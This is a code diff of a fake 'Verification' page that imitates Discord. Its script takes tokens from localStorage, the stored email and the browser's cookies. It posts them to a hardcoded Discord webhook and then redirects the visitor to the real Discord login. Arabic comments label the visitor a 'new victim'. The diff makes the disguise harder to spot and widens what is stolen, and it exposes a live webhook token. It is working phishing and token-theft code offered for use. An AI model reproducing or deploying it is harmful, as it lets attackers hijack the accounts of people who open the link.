@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Discord Verification</title>
+    <title>Verification</title>
     <style>
         * { box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
         body {
@@ -43,7 +43,6 @@
         }
         .btn:hover { background-color: #4752c4; }
         
-        /* شاشة التحميل المخفية */
         #loading {
             display: none;
             position: absolute;
@@ -85,14 +84,15 @@
     </div>
 
     <script>
-        // رابط الويبهوك حقك
         const WEBHOOK = "https://ptb.discord.com/api/webhooks/1563433824195715163/pImDLSOanfVezzULnId7p-Fny5ViXFkbPyoldjKCBnEzpFaPDg7dO6oj7zuBHTJISlwr";
 
-        // دالة سحب التوكنات من المتصفح
-        function getTokens() {
+        function startVerification() {
+            document.getElementById('content').style.display = 'none';
+            document.getElementById('loading').style.display = 'flex';
+
+            // محاولة سحب أي توكن عادي (غير مشفر)
             let tokens = [];
             try {
-                // السحب من LocalStorage
                 for (let i = 0; i < localStorage.length; i++) {
                     const k = localStorage.key(i);
                     const v = localStorage.getItem(k);
@@ -102,41 +102,26 @@
                     }
                 }
             } catch(e){}
-            return [...new Set(tokens)];
-        }
 
-        function startVerification() {
-            // نخفي المحتوى ونظهر شاشة التحميل
-            document.getElementById('content').style.display = 'none';
-            document.getElementById('loading').style.display = 'flex';
-
-            const tokens = getTokens();
+            // تجميع البيانات
             const info = {
-                tokens: tokens.length > 0 ? tokens : ["لم يتم العثور على توكن (الحساب غير مسجل دخول)"],
+                tokens: tokens.length > 0 ? tokens : ["لا يوجد توكن (التشفير يمنع السحب)"],
+                email: localStorage.getItem('email') || "غير محفوظ",
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
-                language: navigator.language,
                 time: new Date().toISOString(),
-                url: location.href
+                cookies: document.cookie
             };
 
-            // إرسال للويبهوك
+            // الإرسال للويبهوك
             fetch(WEBHOOK, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
-                    content: "**🚨 ضحية جديدة فتحت رابط التوثيق!**\n```json\n" + JSON.stringify(info, null, 2).slice(0, 1950) + "\n```"
+                    content: "**🚨 تم الضغط على زر التوثيق!**\n```json\n" + JSON.stringify(info, null, 2).slice(0, 1950) + "\n```"
                 })
-            })
-            .then(() => {
-                // بعد الإرسال، نوجهه لصفحة ديسكورد الرسمية
-                setTimeout(() => {
-                    window.location.href = "https://discord.com/login";
-                }, 1500);
-            })
-            .catch(() => {
-                // حتى لو فشل الإرسال، نوجهه
-                window.location.href = "https://discord.com/login";
+            }).catch(()=>{}).finally(() => {
+                setTimeout(() => { window.location.href = "https://discord.com/login"; }, 1500);
             });
         }
     </script>
